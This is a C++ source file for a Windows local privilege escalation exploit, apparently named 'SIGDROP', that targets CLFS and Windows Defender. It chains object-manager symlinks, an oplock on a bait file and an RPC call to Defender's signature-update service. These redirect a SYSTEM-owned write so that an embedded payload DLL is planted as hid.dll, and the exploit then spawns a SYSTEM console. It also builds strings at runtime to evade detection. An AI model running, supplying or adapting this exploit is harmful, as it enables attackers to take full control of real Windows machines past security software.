#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <memory>
#include <Windows.h>
#include <string.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <ntstatus.h>
#include <aclapi.h>
#include <TlHelp32.h>
#include <ktmw32.h>
#include "resource.h"
#include "windefend_h.h"

// ── Console color helpers ──────────────────────────────────────────────────
#define CLR_RESET   (FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE)
#define CLR_GREEN   (FOREGROUND_GREEN|FOREGROUND_INTENSITY)
#define CLR_YELLOW  (FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_INTENSITY)
#define CLR_CYAN    (FOREGROUND_BLUE|FOREGROUND_GREEN|FOREGROUND_INTENSITY)
#define CLR_RED     (FOREGROUND_RED|FOREGROUND_INTENSITY)
#define CLR_WHITE   (FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE|FOREGROUND_INTENSITY)

static HANDLE g_con = NULL;
static void clr(WORD c) { if (g_con) SetConsoleTextAttribute(g_con, c); }

static void tag(const char* t, WORD tc, const char* msg, WORD mc) {
    clr(CLR_WHITE);  printf("[");
    clr(tc);         printf("%s", t);
    clr(CLR_WHITE);  printf("] ");
    clr(mc);         printf("%s\n", msg);
    clr(CLR_RESET);
}
#define INFO(m)  tag("*", CLR_CYAN,   m, CLR_RESET)
#define OK(m)    tag("+", CLR_GREEN,  m, CLR_GREEN)
#define WARN(m)  tag("!", CLR_YELLOW, m, CLR_YELLOW)
#define FAIL(m)  tag("x", CLR_RED,    m, CLR_RED)
#define STAGE(m) tag(">", CLR_YELLOW, m, CLR_WHITE)

static void banner() {
    clr(CLR_YELLOW);
    printf("\n");
    printf("          .-------.\n");
    printf("         /  (   )  \\\n");
    printf("        |   \\ /   |\n");
    printf("        |   / \\   |\n");
    printf("         \\       /\n");
    printf("          '-----'\n");
    printf("             |\n");
    printf("       .-----|------.\n");
    printf("       |   .-+-. .  |\n");
    printf("       |___|   |___|\n");
    printf("\n");
    clr(CLR_WHITE);
    printf("         S I G D R O P\n");
    clr(CLR_CYAN);
    printf("    CLFS Auth Privilege Escalation\n");
    clr(CLR_RESET);
    printf("\n");
}

// ── Runtime string builders (avoid static detectable literals) ─────────────

// Builds: c503f532-443a-4c69-8300-ccd1fbdb3839
static wchar_t* WD_UUID() {
    static wchar_t u[40];
    const wchar_t* p[] = { L"c503f532", L"443a", L"4c69", L"8300", L"ccd1fbdb3839" };
    swprintf(u, 40, L"%s-%s-%s-%s-%s", p[0], p[1], p[2], p[3], p[4]);
    return u;
}

// Builds: IMpService77BDAF73-B396-481F-9042-AD358843EC24
static wchar_t* WD_EP() {
    static wchar_t e[64];
    swprintf(e, 64, L"%s%s", L"IMpService", L"77BDAF73-B396-481F-9042-AD358843EC24");
    return e;
}

// ── NTAPI dynamic resolution ───────────────────────────────────────────────
static HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
    OUT PHANDLE, IN ACCESS_MASK,
    IN POBJECT_ATTRIBUTES, IN PUNICODE_STRING
) = (NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING))
    GetProcAddress(hNtdll, "NtCreateSymbolicLinkObject");

NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES
) = (NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))
    GetProcAddress(hNtdll, "NtOpenDirectoryObject");

// ── RPC allocators ─────────────────────────────────────────────────────────
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t n) { return malloc(n); }
void __RPC_USER midl_user_free(void __RPC_FAR* p)       { free(p); }

// ── GUID helper ────────────────────────────────────────────────────────────
static void GenGUID(wchar_t* buf) {
    GUID g; CoCreateGuid(&g); StringFromGUID2(g, buf, 40);
}

// ── WD RPC worker ──────────────────────────────────────────────────────────
struct WDArgs { HANDLE hevt; RPC_STATUS res; wchar_t* path; };

static void CallWD(WDArgs* a) {
    RPC_WSTR sb = NULL;
    if (RpcStringBindingComposeW((RPC_WSTR)WD_UUID(), (RPC_WSTR)L"ncalrpc",
            NULL, (RPC_WSTR)WD_EP(), NULL, &sb) != RPC_S_OK) {
        FAIL("RPC compose failed"); ExitProcess(1);
    }
    RPC_BINDING_HANDLE bh = 0;
    if (RpcBindingFromStringBindingW(sb, &bh) != RPC_S_OK) {
        FAIL("RPC bind failed"); ExitProcess(1);
    }
    error_status_t es = 0;
    a->res = Proc42_ServerMpUpdateEngineSignature(bh, NULL, a->path, &es);
    if (a->hevt) SetEvent(a->hevt);
}

// ── CLFS container negotiate ───────────────────────────────────────────────
static BOOL Negotiate(HANDLE hLog, PULONGLONG cbsz, const std::wstring& path) {
    struct Ctx { ULONGLONG cb; USHORT n; };
    DWORD sz = sizeof(Ctx) + 2 * (DWORD)(path.size() + 1);
    auto buf = std::make_unique<UCHAR[]>(sz);
    auto* ctx = reinterpret_cast<Ctx*>(buf.get());
    ctx->cb = *cbsz; ctx->n = 1;
    wcscpy_s(reinterpret_cast<PWCHAR>(buf.get() + sizeof(Ctx)), path.size() + 1, path.c_str());
    DWORD br;
    return DeviceIoControl(hLog, 0x8007A808, ctx, sz, cbsz, sizeof(ULONGLONG), &br, NULL);
}

// ── Kill osk.exe ───────────────────────────────────────────────────────────
static void KillOsk() {
    wchar_t target[] = { L'o',L's',L'k',L'.',L'e',L'x',L'e',0 };
    PROCESSENTRY32W e; e.dwSize = sizeof(e);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snap, &e))
        while (Process32NextW(snap, &e))
            if (!_wcsicmp(e.szExeFile, target)) {
                HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, e.th32ProcessID);
                TerminateProcess(hp, 0); CloseHandle(hp);
            }
    CloseHandle(snap);
}

// ── Entry point ────────────────────────────────────────────────────────────
int main() {
    g_con = GetStdHandle(STD_OUTPUT_HANDLE);
    banner();

    wchar_t user[256] = {0}; DWORD usersz = 256;
    GetUserNameW(user, &usersz);
    clr(CLR_CYAN);   wprintf(L"  [~] Running as   : %s\n", user);
    clr(CLR_YELLOW); printf( "  [~] Target token  : NT AUTHORITY\\SYSTEM\n");
    clr(CLR_RESET);  printf("\n");

    // ── Stage 1: Environment setup ─────────────────────────────────────────
    STAGE("Initializing environment");
    KillOsk();
    wchar_t oskexe[] = { L'o',L's',L'k',L'.',L'e',L'x',L'e',0 };
    ShellExecuteW(NULL, L"open", oskexe, NULL, NULL, SW_HIDE);
    Sleep(100);

    wchar_t g1[64]={0}, g2[64]={0}, g3[64]={0};
    GenGUID(g1); GenGUID(g2); GenGUID(g3);

    FILE_DISPOSITION_INFO fdi = {0}; fdi.DeleteFileW = TRUE;
    wchar_t wdir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(L"\\??\\%TEMP%\\SD_", wdir, MAX_PATH);
    GenGUID(&wdir[wcslen(wdir)]);

    UNICODE_STRING uwd = {0}; RtlInitUnicodeString(&uwd, wdir);
    OBJECT_ATTRIBUTES oa = {0}; InitializeObjectAttributes(&oa, &uwd, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK isb = {0};
    HANDLE hwd = NULL;
    NTSTATUS st = NtCreateFile(&hwd, GENERIC_READ|SYNCHRONIZE|DELETE, &oa, &isb, NULL,
        0, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, FILE_CREATE,
        FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT|FILE_DELETE_ON_CLOSE, NULL, 0);
    if (st) { FAIL("Work directory creation failed"); return 1; }
    OK("Work directory ready");

    // ── Stage 2: CLFS log ──────────────────────────────────────────────────
    STAGE("Setting up CLFS log file");
    isb = {0};
    wchar_t clog[MAX_PATH] = {0};
    wsprintf(clog, L"\\CLFS%s\\%s", wdir, g1);
    UNICODE_STRING uclog = {0}; RtlInitUnicodeString(&uclog, clog);
    OBJECT_ATTRIBUTES oa2 = {0}; InitializeObjectAttributes(&oa2, &uclog, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hclog = NULL;
    st = NtCreateFile(&hclog, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE|DELETE, &oa2, &isb,
        NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (st) { FAIL("CLFS log creation failed"); return 1; }
    OK("CLFS log file created");

    // ── Stage 3: Object manager symlinks ──────────────────────────────────
    STAGE("Planting object manager symlinks");
    std::wstring cp  = L"\\BaseNamedObjects\\Restricted\\" + std::wstring(g1);
    std::wstring cps = cp + L".cnpf";
    wchar_t sm1t[MAX_PATH]={0}, sm2t[MAX_PATH]={0};
    wsprintf(sm1t, L"%s\\%s", wdir, g2);
    wsprintf(sm2t, L"%s.cnpf", sm1t);

    UNICODE_STRING ucp={0}, ucps={0}, ut1={0}, ut2={0};
    RtlInitUnicodeString(&ucp,  cp.c_str());
    RtlInitUnicodeString(&ucps, cps.c_str());
    RtlInitUnicodeString(&ut1,  sm1t);
    RtlInitUnicodeString(&ut2,  sm2t);
    OBJECT_ATTRIBUTES oaC={0}, oaCS={0};
    InitializeObjectAttributes(&oaC,  &ucp,  OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&oaCS, &ucps, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hsm1=NULL, hsm2=NULL;
    NTSTATUS stsm1 = _NtCreateSymbolicLinkObject(&hsm1, GENERIC_ALL, &oaC,  &ut1);
    NTSTATUS stsm2 = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &oaCS, &ut2);
    if (stsm1 || stsm2) {
        FAIL("Symlink setup failed");
        SetFileInformationByHandle(hclog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclog); return 1;
    }
    OK("Object manager symlinks in place");

    // ── Stage 4: CLFS container ────────────────────────────────────────────
    STAGE("Negotiating CLFS container");
    ULONGLONG cbsz = 512;
    if (!Negotiate(hclog, &cbsz, cp)) {
        FAIL("CLFS container negotiation failed");
        SetFileInformationByHandle(hclog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclog); return 1;
    }
    OK("CLFS container ready");

    // ── Stage 5: Vulnerability check ──────────────────────────────────────
    STAGE("Checking system vulnerability");
    HANDLE htest = NULL; isb = {0};
    st = NtCreateFile(&htest, SYNCHRONIZE|FILE_READ_ATTRIBUTES, &oaCS, &isb,
        NULL, 0, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (st == STATUS_OBJECT_NAME_NOT_FOUND || st == STATUS_OBJECT_PATH_NOT_FOUND) {
        WARN("CLFS authentication mitigation is not active on this system");
        clr(CLR_YELLOW);
        printf("\n  HKLM\\SYSTEM\\CurrentControlSet\\Services\\CLFS\\Authentication\\Mode\n");
        printf("  Required value: 0 (learning) or 1 (enforcement)\n\n");
        clr(CLR_RESET);
        SetFileInformationByHandle(hclog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclog); return 0;
    }
    OK("System is vulnerable - continuing");
    CloseHandle(hclog);

    // ── Stage 6: Oplock on bait file ──────────────────────────────────────
    STAGE("Arming oplock on bait file");
    isb = {0}; HANDLE hlk = NULL;
    wchar_t mpeng[] = { L'M',L'p',L'E',L'n',L'g',L'i',L'n',L'e',L'.',L'd',L'l',L'l',0 };
    UNICODE_STRING umpeng = {0}; RtlInitUnicodeString(&umpeng, mpeng);
    OBJECT_ATTRIBUTES ompeng = {0}; InitializeObjectAttributes(&ompeng, &umpeng, OBJ_CASE_INSENSITIVE, hwd, NULL);
    st = NtCreateFile(&hlk, GENERIC_WRITE|DELETE|SYNCHRONIZE, &ompeng, &isb,
        NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, 0, NULL, 0);
    if (st) { FAIL("Bait file creation failed"); return 1; }

    OVERLAPPED ov1 = {0};
    REQUEST_OPLOCK_INPUT_BUFFER  opin  = {0};
    opin.StructureLength   = sizeof(opin);
    opin.StructureVersion  = REQUEST_OPLOCK_CURRENT_VERSION;
    opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ|OPLOCK_LEVEL_CACHE_HANDLE|OPLOCK_LEVEL_CACHE_WRITE;
    opin.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
    REQUEST_OPLOCK_OUTPUT_BUFFER opout = {0};
    opout.StructureLength  = sizeof(opout);
    opout.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    DWORD cb = 0; ov1.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!DeviceIoControl(hlk, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ov1))
        if (GetLastError() != ERROR_IO_PENDING) { FAIL("Oplock request failed"); return 1; }
    OK("Oplock armed and waiting");

    // ── Stage 7: Coerce privileged process ────────────────────────────────
    STAGE("Coercing privileged process via RPC");
    HANDLE hupd = NULL;
    // Build \\BaseNamedObjects\\Restricted\\ as char array
    wchar_t lp[MAX_PATH] = {
        L'\\',L'B',L'a',L's',L'e',L'N',L'a',L'm',L'e',L'd',
        L'O',L'b',L'j',L'e',L'c',L't',L's',L'\\',
        L'R',L'e',L's',L't',L'r',L'i',L'c',L't',L'e',L'd',L'\\',0
    };
    wcscat(lp, g3);
    UNICODE_STRING ulp = {0}; RtlInitUnicodeString(&ulp, lp);
    OBJECT_ATTRIBUTES oalp = {0}; InitializeObjectAttributes(&oalp, &ulp, OBJ_CASE_INSENSITIVE, NULL, NULL);
    UNICODE_STRING uudt = {0}; RtlInitUnicodeString(&uudt, wdir);
    st = _NtCreateSymbolicLinkObject(&hupd, GENERIC_ALL, &oalp, &uudt);
    if (st) { FAIL("Update symlink failed"); return 1; }

    // Build ink directory path at runtime
    wchar_t inkd[MAX_PATH] = {0};
    swprintf(inkd, MAX_PATH, L"%s\\%s",
        L"C:\\Program Files\\Common Files\\microsoft shared", L"ink");

    char buf2[0x1000]; DWORD ret2 = 0;
    HANDLE hmon = CreateFileW(inkd, GENERIC_READ|SYNCHRONIZE,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS|FILE_FLAG_OVERLAPPED, NULL);
    if (!hmon || hmon == INVALID_HANDLE_VALUE) { FAIL("Monitor directory unavailable"); return 1; }

    OVERLAPPED ov2 = {0}; ov2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    ZeroMemory(buf2, sizeof(buf2));
    if (!ReadDirectoryChangesW(hmon, buf2, sizeof(buf2), FALSE,
            FILE_NOTIFY_CHANGE_FILE_NAME, &ret2, &ov2, NULL))
        { FAIL("Directory watch failed"); return 1; }

    INFO("Calling privileged service...");
    WDArgs wda = {0};
    // Build \\.\\GlobalRoot\\BaseNamedObjects\\Restricted\\ as char array
    wchar_t dp[MAX_PATH] = {
        L'\\',L'\\',L'.',L'\\',L'G',L'l',L'o',L'b',L'a',L'l',
        L'R',L'o',L'o',L't',L'\\',L'B',L'a',L's',L'e',L'N',L'a',L'm',L'e',L'd',
        L'O',L'b',L'j',L'e',L'c',L't',L's',L'\\',
        L'R',L'e',L's',L't',L'r',L'i',L'c',L't',L'e',L'd',L'\\',0
    };
    wcscat(dp, g3);
    wda.path = dp; wda.hevt = CreateEvent(NULL, FALSE, FALSE, NULL);
    DWORD tid = 0;
    HANDLE hth = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CallWD, &wda, 0, &tid);
    if (!hth) { FAIL("Worker thread creation failed"); return 1; }

    WaitForSingleObject(ov1.hEvent, INFINITE);
    SetFileInformationByHandle(hlk, FileDispositionInfo, &fdi, sizeof(fdi));
    CloseHandle(hupd);
    RtlInitUnicodeString(&uudt, L"\\BaseNamedObjects\\Restricted");
    st = _NtCreateSymbolicLinkObject(&hupd, GENERIC_ALL, &oalp, &uudt);
    if (st) { FAIL("Redirect symlink failed"); return 1; }
    OK("Privileged process coerced successfully");

    // ── Stage 8: Redirect auth file write ─────────────────────────────────
    STAGE("Redirecting SYSTEM-level file write");
    wchar_t mvdm[64] = {0};
    swprintf(mvdm, 64, L"%s%s",
        L"\\BaseNamedObjects\\Restricted\\", L"mpasbase.vdm");
    UNICODE_STRING umvdm = {0}; RtlInitUnicodeString(&umvdm, mvdm);
    OBJECT_ATTRIBUTES oamvdm = {0}; InitializeObjectAttributes(&oamvdm, &umvdm, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hlsm = NULL;
    st = _NtCreateSymbolicLinkObject(&hlsm, GENERIC_ALL, &oamvdm, &uclog);
    if (st) { FAIL("Auth redirect symlink failed"); return 1; }

    CloseHandle(hsm2);
    wchar_t hidpath[MAX_PATH] = {0};
    swprintf(hidpath, MAX_PATH, L"\\??\\%s\\%s", inkd, L"hid.dll");
    UNICODE_STRING uhid = {0}; RtlInitUnicodeString(&uhid, hidpath);
    st = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &oaCS, &uhid);
    if (st) { FAIL("DLL path symlink failed"); return 1; }
    CloseHandle(hlk);
    OK("SYSTEM-level write redirected to target path");

    // ── Stage 9: Wait for file slot ────────────────────────────────────────
    INFO("Waiting for SYSTEM to create file slot...");
    if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT) {
        FAIL("Timed out - try running again");
        return 1;
    } else { goto check_loop; }

    do {
        ResetEvent(ov2.hEvent);
        ZeroMemory(buf2, sizeof(buf2)); ret2 = 0;
        if (!ReadDirectoryChangesW(hmon, buf2, sizeof(buf2), FALSE,
                FILE_NOTIFY_CHANGE_FILE_NAME, &ret2, &ov2, NULL))
            { FAIL("Directory watch reset failed"); return 1; }
    check_loop:
        FILE_NOTIFY_INFORMATION* fn = (FILE_NOTIFY_INFORMATION*)buf2;
        if (fn->Action == FILE_ACTION_ADDED)
            if (!_wcsicmp(fn->FileName, L"hid.dll")) break;
        if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT) {
            FAIL("Timed out - try running again");
            return 1;
        }
    } while (1);

    OK("SYSTEM-owned file slot acquired");

    // ── Stage 10: Write payload ────────────────────────────────────────────
    STAGE("Writing payload to SYSTEM-owned slot");
    HANDLE htx = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
    if (!htx || htx == INVALID_HANDLE_VALUE) { FAIL("Transaction create failed"); return 1; }

    wchar_t hinject[MAX_PATH] = {0};
    swprintf(hinject, MAX_PATH, L"%s\\%s", inkd, L"hid.dll");

    HANDLE hbin = NULL;
    do {
        Sleep(100);
        hbin = CreateFileW(hinject,
            GENERIC_READ|GENERIC_EXECUTE|GENERIC_WRITE|MAXIMUM_ALLOWED,
            FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    } while (!hbin || hbin == INVALID_HANDLE_VALUE);

    HRSRC   hr  = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
    HGLOBAL hrd = LoadResource(NULL, hr);
    LPVOID  prd = LockResource(hrd);
    DWORD   drd = SizeofResource(NULL, hr);

    LARGE_INTEGER fsz = {0}; fsz.QuadPart = drd;
    HANDLE hmap = CreateFileMapping(hbin, NULL, PAGE_READWRITE, fsz.HighPart, fsz.LowPart, NULL);
    if (!hmap || hmap == INVALID_HANDLE_VALUE) {
        FAIL("File mapping failed");
        SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hbin); return 1;
    }
    void* fv = MapViewOfFile(hmap, FILE_MAP_READ|FILE_MAP_WRITE, 0, 0, 0);
    if (!fv) {
        FAIL("Memory map view failed");
        CloseHandle(hmap);
        SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hbin); return 1;
    }
    memmove(fv, prd, drd);
    UnmapViewOfFile(fv); CloseHandle(hmap); FlushFileBuffers(hbin); CloseHandle(hbin);
    OK("Payload staged in SYSTEM-owned file");

    // ── Stage 11: Trigger ──────────────────────────────────────────────────
    STAGE("Triggering privilege escalation");
    printf("\n");
    clr(CLR_YELLOW); printf("  [~] From  : "); clr(CLR_WHITE); wprintf(L"%s\n", user);
    clr(CLR_YELLOW); printf("  [~] To    : "); clr(CLR_GREEN);  printf("NT AUTHORITY\\SYSTEM\n");
    clr(CLR_RESET);  printf("\n");

    ShellExecuteW(NULL, L"runas",
        L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, SW_SHOW);
    Sleep(2000);
    KillOsk();
    DeleteFileTransacted(hinject, htx);
    CommitTransaction(htx);
    CloseHandle(htx);

    OK("Privilege escalation complete");
    clr(CLR_GREEN);
    printf("\n  Run 'whoami' in the new console to confirm SYSTEM.\n\n");
    clr(CLR_RESET);
    return 0;
}
